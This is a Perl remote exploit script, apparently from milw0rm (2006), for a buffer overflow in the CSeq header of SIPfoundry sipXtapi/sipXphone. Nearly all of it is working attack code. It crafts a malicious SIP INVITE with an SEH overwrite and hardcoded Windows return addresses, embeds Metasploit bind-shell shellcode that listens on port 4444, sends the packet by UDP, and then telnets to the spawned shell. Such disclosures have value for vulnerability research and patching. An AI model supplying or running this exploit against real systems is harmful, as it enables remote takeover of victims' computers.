<html><head><title>SIPfoundry sipXtapi (CSeq) Remote Buffer Overflow Exploit</title></head><pre>#!/usr/bin/perl
# 
# Remote Buffer Overflow in sipXtapi
# 
# bad char 0x00 0x09 0x0a 0x0d 0x20
#


use IO::Socket;
#use strict;

print &quot;\n\n&quot;;
print &quot;sipXtapi original Exploit by Michael Thumann added a real shellcode by acaro\n\n&quot;;
print &quot;tested on sipXphone 2.6.0.27 read the code for ret address\n\n&quot;;

if (not $ARGV[0]) {
        print &quot;Usage: sipx.pl &lt;host&gt;\n&quot;;
exit;}

$target=$ARGV[0];
my $source =&quot;127.0.0.1&quot;;
my $target_port = 5060;
my $user =&quot;bad&quot;;
my $nextseh = &quot;\xeb\x06\x90\x90&quot;;
my $seh=&quot;\xb0\x67\x01\x08&quot;;	# pop pop ret in jvm.dll for winxp Pro SP2 Italian universal ?
#my $seh=&quot;\x27\x13\x02\x08&quot;;	# call ebx in jvm.dll for win2k Pro SP0 Italian universal ?
#my $seh=&quot;\x22\x92\x06\x08&quot;;	# jmp ebx in jvm.dll for win2k Pro SP0 Italian universal ? 
				# if you use this ret you can exploits the target host many times
my $nop = &quot;\x90&quot;x32;


# win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com
my $shellcode = 
&quot;\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x25&quot;.
&quot;\xe3\xa5\x9f\x83\xeb\xfc\xe2\xf4\xd9\x89\x4e\xd2\xcd\x1a\x5a\x60&quot;.
&quot;\xda\x83\x2e\xf3\x01\xc7\x2e\xda\x19\x68\xd9\x9a\x5d\xe2\x4a\x14&quot;.
&quot;\x6a\xfb\x2e\xc0\x05\xe2\x4e\xd6\xae\xd7\x2e\x9e\xcb\xd2\x65\x06&quot;.
&quot;\x89\x67\x65\xeb\x22\x22\x6f\x92\x24\x21\x4e\x6b\x1e\xb7\x81\xb7&quot;.
&quot;\x50\x06\x2e\xc0\x01\xe2\x4e\xf9\xae\xef\xee\x14\x7a\xff\xa4\x74&quot;.
&quot;\x26\xcf\x2e\x16\x49\xc7\xb9\xfe\xe6\xd2\x7e\xfb\xae\xa0\x95\x14&quot;.
&quot;\x65\xef\x2e\xef\x39\x4e\x2e\xdf\x2d\xbd\xcd\x11\x6b\xed\x49\xcf&quot;.
&quot;\xda\x35\xc3\xcc\x43\x8b\x96\xad\x4d\x94\xd6\xad\x7a\xb7\x5a\x4f&quot;.
&quot;\x4d\x28\x48\x63\x1e\xb3\x5a\x49\x7a\x6a\x40\xf9\xa4\x0e\xad\x9d&quot;.
&quot;\x70\x89\xa7\x60\xf5\x8b\x7c\x96\xd0\x4e\xf2\x60\xf3\xb0\xf6\xcc&quot;.
&quot;\x76\xb0\xe6\xcc\x66\xb0\x5a\x4f\x43\x8b\xb4\xc3\x43\xb0\x2c\x7e&quot;.
&quot;\xb0\x8b\x01\x85\x55\x24\xf2\x60\xf3\x89\xb5\xce\x70\x1c\x75\xf7&quot;.
&quot;\x81\x4e\x8b\x76\x72\x1c\x73\xcc\x70\x1c\x75\xf7\xc0\xaa\x23\xd6&quot;.
&quot;\x72\x1c\x73\xcf\x71\xb7\xf0\x60\xf5\x70\xcd\x78\x5c\x25\xdc\xc8&quot;.
&quot;\xda\x35\xf0\x60\xf5\x85\xcf\xfb\x43\x8b\xc6\xf2\xac\x06\xcf\xcf&quot;.
&quot;\x7c\xca\x69\x16\xc2\x89\xe1\x16\xc7\xd2\x65\x6c\x8f\x1d\xe7\xb2&quot;.
&quot;\xdb\xa1\x89\x0c\xa8\x99\x9d\x34\x8e\x48\xcd\xed\xdb\x50\xb3\x60&quot;.
&quot;\x50\xa7\x5a\x49\x7e\xb4\xf7\xce\x74\xb2\xcf\x9e\x74\xb2\xf0\xce&quot;.
&quot;\xda\x33\xcd\x32\xfc\xe6\x6b\xcc\xda\x35\xcf\x60\xda\xd4\x5a\x4f&quot;.
&quot;\xae\xb4\x59\x1c\xe1\x87\x5a\x49\x77\x1c\x75\xf7\xd5\x69\xa1\xc0&quot;.
&quot;\x76\x1c\x73\x60\xf5\xe3\xa5\x9f&quot;;
my $cseq =(&quot;\x41&quot;x204).$nextseh.$seh.$nop.$shellcode;


my $packet =&lt;&lt;END;
INVITE sip:user\@$source SIP/2.0\r
To: &lt;sip:$target:$target_port&gt;\r
Via: SIP/2.0/UDP $target:3277\r
From: &quot;moz&quot;&lt;sip:$target:3277&gt;\r
Call-ID: 3121$target\r
CSeq: $cseq\r
Max-Forwards: 70\r
Contact: &lt;sip:$source:5059&gt;\r
\r
END

print &quot;Sending Packet to: &quot; . $target . &quot;\n\n&quot;;
socket(PING, PF_INET, SOCK_DGRAM, getprotobyname(&quot;udp&quot;));
my $ipaddr = inet_aton($target);
my $sendto = sockaddr_in($target_port,$ipaddr);
send(PING, $packet, 0, $sendto) == length($packet) or die &quot;cannot send to $target : $target_port : $!\n&quot;;
print &quot;Done.\n&quot;;
$host = $ARGV[0];

print &quot; + connect to $host on port 4444...\n&quot;;

system(&quot;telnet $host 4444&quot;);

# milw0rm.com [2006-07-24]</pre></html>